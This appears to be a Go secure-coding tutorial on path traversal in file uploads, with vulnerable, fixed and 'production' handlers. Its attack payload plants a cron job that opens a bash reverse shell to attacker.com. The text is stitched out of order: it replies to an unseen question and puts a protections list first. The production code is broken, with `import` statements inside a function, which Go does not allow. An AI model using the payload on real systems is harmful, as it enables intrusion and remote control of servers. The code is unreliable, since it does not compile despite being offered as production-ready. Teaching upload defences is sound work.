**Additional Protections**:
- **Content-Disposition: attachment**: Prevents browser from executing uploaded files inline
- **Separate domain for uploads**: Serve user content from `cdn.example.com` not `www.example.com` to prevent cookie theft
- **S3 bucket policy**: Block public access, require authentication for all operations
- **Virus scanning pipeline**: Async scanning with quarantine for suspicious files
- **File quota enforcement**: Prevent storage exhaustion attacks per user/tenant
- **Retention policies**: Auto-delete old uploads, GDPR compliance for user data deletion

File upload handling is a critical security area. The 2024 Fortinet FortiOS vulnerability (CVE-2024-21762) showed how path traversal in file operations can lead to complete system compromise affecting 150,000+ devices.

**VULNERABLE CODE**:

```go
package main

import (
	"io"
	"net/http"
	"os"
	"path/filepath"
)

const uploadDir = "./uploads"

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// VULNERABLE: Using filename directly from user input
	filename := r.FormValue("filename")
	if filename == "" {
		http.Error(w, "Filename required", http.StatusBadRequest)
		return
	}

	file, _, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Error reading file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// DANGEROUS: Direct path concatenation with user input
	destPath := filepath.Join(uploadDir, filename)

	dst, err := os.Create(destPath)
	if err != nil {
		http.Error(w, "Error creating file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	io.Copy(dst, file)
	w.Write([]byte("File uploaded successfully"))
}
```

**Attack Payload**:
```text
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="filename"

../../../etc/cron.d/backdoor
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.txt"
Content-Type: text/plain

* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
------WebKitFormBoundary--
```

**Why This Is Dangerous**:
- `filepath.Join()` does NOT sanitize path traversal sequences - it simply joins paths
- Attacker can escape upload directory using `../` sequences
- Can overwrite system files like `/etc/cron.d/*`, `/etc/passwd`, or web application files
- On Windows, can use `..\` or absolute paths like `C:\Windows\System32\`

**SECURE VERSION**:

```go
package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

const uploadDir = "./uploads"

var allowedExtensions = map[string]bool{
	".jpg":  true,
	".jpeg": true,
	".png":  true,
	".gif":  true,
}

func generateSecureFilename(originalExt string) (string, error) {
	bytes := make([]byte, 16)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return hex.EncodeToString(bytes) + originalExt, nil
}

func secureUploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Limit upload size to 5MB
	r.Body = http.MaxBytesReader(w, r.Body, 5<<20)

	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Error reading file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// SECURE: Extract and validate extension from original filename
	ext := strings.ToLower(filepath.Ext(header.Filename))
	if !allowedExtensions[ext] {
		http.Error(w, "File type not allowed", http.StatusBadRequest)
		return
	}

	// SECURE: Generate random filename, ignore user input
	secureFilename, err := generateSecureFilename(ext)
	if err != nil {
		http.Error(w, "Internal error", http.StatusInternalServerError)
		return
	}

	destPath := filepath.Join(uploadDir, secureFilename)

	// SECURE: Verify final path is within upload directory
	absUploadDir, _ := filepath.Abs(uploadDir)
	absDestPath, _ := filepath.Abs(destPath)
	if !strings.HasPrefix(absDestPath, absUploadDir+string(os.PathSeparator)) {
		http.Error(w, "Invalid file path", http.StatusBadRequest)
		return
	}

	dst, err := os.Create(destPath)
	if err != nil {
		http.Error(w, "Error creating file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	io.Copy(dst, file)
	w.Write([]byte(fmt.Sprintf("File uploaded as: %s", secureFilename)))
}
```

**Key Security Controls**:
- **Random filename generation**: Never use user-provided filenames directly; generate cryptographically random names
- **Extension whitelist**: Only allow specific, known-safe file extensions
- **Path canonicalization check**: Resolve absolute paths and verify destination stays within upload directory
- **File size limit**: Prevent DoS via large file uploads

Excellent security thinking! Extension-based validation alone is insufficient. Attackers routinely bypass it using polyglot files or MIME type spoofing. The 2023 WordPress arbitrary file upload vulnerabilities demonstrated how relying solely on extensions leads to RCE.

**PRODUCTION PATTERN**:

```go
package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"image"
	_ "image/gif"
	_ "image/jpeg"
	_ "image/png"
	"io"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type FileUploadService struct {
	uploadDir      string
	maxFileSize    int64
	allowedTypes   map[string][]byte // extension -> magic bytes
	logger         *slog.Logger
}

func NewFileUploadService(uploadDir string, logger *slog.Logger) *FileUploadService {
	return &FileUploadService{
		uploadDir:   uploadDir,
		maxFileSize: 5 << 20, // 5MB
		allowedTypes: map[string][]byte{
			".jpg":  {0xFF, 0xD8, 0xFF},
			".jpeg": {0xFF, 0xD8, 0xFF},
			".png":  {0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A},
			".gif":  {0x47, 0x49, 0x46, 0x38},
		},
		logger: logger,
	}
}

func (s *FileUploadService) validateMagicBytes(content []byte, ext string) bool {
	magic, ok := s.allowedTypes[ext]
	if !ok {
		return false
	}
	return bytes.HasPrefix(content, magic)
}

func (s *FileUploadService) validateImageContent(content []byte) error {
	// Actually decode the image to verify it's valid
	_, _, err := image.Decode(bytes.NewReader(content))
	if err != nil {
		return fmt.Errorf("invalid image content: %w", err)
	}
	return nil
}

func (s *FileUploadService) stripExifMetadata(content []byte) ([]byte, error) {
	// Decode and re-encode to strip metadata
	img, format, err := image.Decode(bytes.NewReader(content))
	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	switch format {
	case "jpeg":
		// Re-encode strips EXIF data
		import "image/jpeg"
		jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85})
	case "png":
		import "image/png"
		png.Encode(&buf, img)
	case "gif":
		import "image/gif"
		gif.Encode(&buf, img, nil)
	}
	return buf.Bytes(), nil
}

func (s *FileUploadService) generateSecureFilename(ext string) (string, error) {
	bytes := make([]byte, 16)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return hex.EncodeToString(bytes) + ext, nil
}

func (s *FileUploadService) HandleUpload(w http.ResponseWriter, r *http.Request) {
	ctx := r.Context()
	requestID := r.Header.Get("X-Request-ID")
	clientIP := r.RemoteAddr

	// Timeout context for upload processing
	ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Rate limiting check (assumes middleware sets this)
	if r.Header.Get("X-RateLimit-Remaining") == "0" {
		s.logger.Warn("rate limit exceeded",
			slog.String("request_id", requestID),
			slog.String("client_ip", clientIP),
		)
		http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
		return
	}

	// DEFENSE LAYER 1: Size limit
	r.Body = http.MaxBytesReader(w, r.Body, s.maxFileSize)

	file, header, err := r.FormFile("file")
	if err != nil {
		s.logger.Error("file upload error",
			slog.String("request_id", requestID),
			slog.String("error", err.Error()),
		)
		http.Error(w, "Error reading file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// DEFENSE LAYER 2: Extension whitelist
	ext := strings.ToLower(filepath.Ext(header.Filename))
	if _, ok := s.allowedTypes[ext]; !ok {
		s.logger.Warn("blocked file extension",
			slog.String("request_id", requestID),
			slog.String("extension", ext),
			slog.String("client_ip", clientIP),
		)
		http.Error(w, "File type not allowed", http.StatusBadRequest)
		return
	}

	// Read file content into memory for validation
	content, err := io.ReadAll(file)
	if err != nil {
		http.Error(w, "Error reading file content", http.StatusBadRequest)
		return
	}

	// DEFENSE LAYER 3: Magic byte validation
	if !s.validateMagicBytes(content, ext) {
		s.logger.Warn("magic byte mismatch - possible attack",
			slog.String("request_id", requestID),
			slog.String("claimed_ext", ext),
			slog.String("client_ip", clientIP),
		)
		http.Error(w, "File content does not match extension", http.StatusBadRequest)
		return
	}

	// DEFENSE LAYER 4: Deep content validation
	if err := s.validateImageContent(content); err != nil {
		s.logger.Warn("invalid image content",
			slog.String("request_id", requestID),
			slog.String("error", err.Error()),
			slog.String("client_ip", clientIP),
		)
		http.Error(w, "Invalid image file", http.StatusBadRequest)
		return
	}

	// DEFENSE LAYER 5: Generate random filename
	secureFilename, err := s.generateSecureFilename(ext)
	if err != nil {
		http.Error(w, "Internal error", http.StatusInternalServerError)
		return
	}

	destPath := filepath.Join(s.uploadDir, secureFilename)

	// DEFENSE LAYER 6: Path traversal prevention
	absUploadDir, _ := filepath.Abs(s.uploadDir)
	absDestPath, _ := filepath.Abs(destPath)
	if !strings.HasPrefix(absDestPath, absUploadDir+string(os.PathSeparator)) {
		s.logger.Error("path traversal attempt blocked",
			slog.String("request_id", requestID),
			slog.String("attempted_path", destPath),
			slog.String("client_ip", clientIP),
		)
		http.Error(w, "Invalid file path", http.StatusBadRequest)
		return
	}

	// Write with restrictive permissions
	if err := os.WriteFile(destPath, content, 0644); err != nil {
		s.logger.Error("file write error",
			slog.String("request_id", requestID),
			slog.String("error", err.Error()),
		)
		http.Error(w, "Error saving file", http.StatusInternalServerError)
		return
	}

	// Audit log for successful upload
	s.logger.Info("file uploaded successfully",
		slog.String("request_id", requestID),
		slog.String("filename", secureFilename),
		slog.String("original_name", header.Filename),
		slog.Int64("size", int64(len(content))),
		slog.String("client_ip", clientIP),
	)

	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(fmt.Sprintf(`{"filename":"%s","status":"success"}`, secureFilename)))
}

func main() {
	logger := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{
		Level: slog.LevelInfo,
	}))

	uploadService := NewFileUploadService("./uploads", logger)

	http.HandleFunc("/upload", uploadService.HandleUpload)

	// Serve uploads from separate domain/path with no-execute headers
	fs := http.FileServer(http.Dir("./uploads"))
	http.Handle("/files/", http.StripPrefix("/files/", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// CRITICAL: Prevent execution of uploaded files
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment")
		w.Header().Set("X-Content-Type-Options", "nosniff")
		fs.ServeHTTP(w, r)
	})))

	logger.Info("server starting", slog.String("port", "8080"))
	http.ListenAndServe(":8080", nil)
}
